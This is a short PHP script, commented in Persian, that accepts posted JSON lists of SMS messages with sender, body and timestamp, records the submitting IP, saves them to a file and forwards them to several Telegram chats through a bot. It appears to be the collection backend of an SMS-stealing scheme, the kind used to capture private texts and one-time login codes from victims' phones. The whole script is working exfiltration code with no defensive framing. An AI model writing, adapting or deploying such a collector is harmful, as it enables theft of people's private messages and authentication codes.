<?php

// Token و chat_id خود را وارد کنید
$telegramBotToken = ""; 
$chatIds = ["123456789", "123456789"]; // لیست چت آیدی‌ها

// دریافت داده‌ها از درخواست HTTP به صورت JSON
$data = json_decode(file_get_contents('php://input'), true);

// بررسی وجود داده‌ها
$messages = $data['messages'] ?? [];

if (empty($messages)) {
    echo "No messages received.";
    exit;
}

// دریافت IP از درخواست
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// ساخت یک فایل برای ذخیره تمامی پیام‌ها
$fileName = "sms_data_" . date("Y-m-d_H-i-s") . ".txt"; // نام فایل با تاریخ و ساعت
$fileContent = "IP: $ip\n\n"; // اضافه کردن IP به محتوای فایل

// پردازش تمامی پیام‌ها و اضافه کردن آنها به محتوای فایل
foreach ($messages as $message) {
    $address = $message['sender'] ?? 'Unknown';
    $body = $message['body'] ?? 'No body';
    $timestamp = $message['timestamp'] ?? 'Unknown';
    
    // تبدیل تایم‌استمپ از میلی‌ثانیه به ثانیه
    $timestampInSeconds = $timestamp / 1000;

    // فرمت کردن تاریخ
    $formattedDate = date("Y-m-d H:i:s", $timestampInSeconds);

    $fileContent .= "Address: $address\nBody: $body\nDate: $formattedDate\n\n";
}

// ذخیره داده‌ها در فایل جدید
file_put_contents($fileName, $fileContent);

// بررسی حجم فایل (در بایت)
$fileSize = filesize($fileName); // اندازه فایل به بایت
$maxSize = 1024; // حداکثر اندازه فایل به بایت (۱ کیلوبایت)

if ($fileSize > $maxSize) {
    // اگر حجم فایل بیشتر از ۱ کیلوبایت باشد، ارسال به صورت فایل
    $telegramApiUrlFile = "https://api.telegram.org/bot$telegramBotToken/sendDocument";

    $postFieldsFile = [
        'document' => new CURLFile(realpath($fileName)) // ارسال فایل
    ];

    // ارسال به تمامی چت آیدی‌ها
    foreach ($chatIds as $chatId) {
        $postFieldsFile['chat_id'] = $chatId;
        
        $chFile = curl_init();
        curl_setopt($chFile, CURLOPT_URL, $telegramApiUrlFile);
        curl_setopt($chFile, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($chFile, CURLOPT_POST, 1);
        curl_setopt($chFile, CURLOPT_POSTFIELDS, $postFieldsFile);
        $responseFile = curl_exec($chFile);
        curl_close($chFile);
    }

    echo "File sent to Telegram successfully.";
} else {
    // اگر حجم فایل کمتر از ۱ کیلوبایت بود، ارسال به صورت متن
    $formattedMessage = "📩 New SMS \nIP $ip\n\n"; // اضافه کردن آی‌پی به پیام
    foreach ($messages as $message) {
        $address = $message['sender'] ?? 'Unknown';
        $body = $message['body'] ?? 'No body';
        $timestamp = $message['timestamp'] ?? 'Unknown';
        
        // تبدیل تایم‌استمپ از میلی‌ثانیه به ثانیه
        $timestampInSeconds = $timestamp / 1000;

        // فرمت کردن تاریخ
        $formattedDate = date("Y-m-d H:i:s", $timestampInSeconds);

        $formattedMessage .= "From: $address\nBody: $body\nDate: $formattedDate\n\n";
    }
    
    // ارسال پیام به تمامی چت آیدی‌ها
    foreach ($chatIds as $chatId) {
        $telegramApiUrlMessage = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
        $postFieldsMessage = [
            'chat_id' => $chatId, // ارسال به یک چت آیدی
            'text' => $formattedMessage
        ];

        $chMessage = curl_init();
        curl_setopt($chMessage, CURLOPT_URL, $telegramApiUrlMessage);
        curl_setopt($chMessage, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($chMessage, CURLOPT_POST, 1);
        curl_setopt($chMessage, CURLOPT_POSTFIELDS, $postFieldsMessage);
        curl_exec($chMessage);
        curl_close($chMessage);
    }

    echo "Messages sent as text to Telegram.";
}

?>
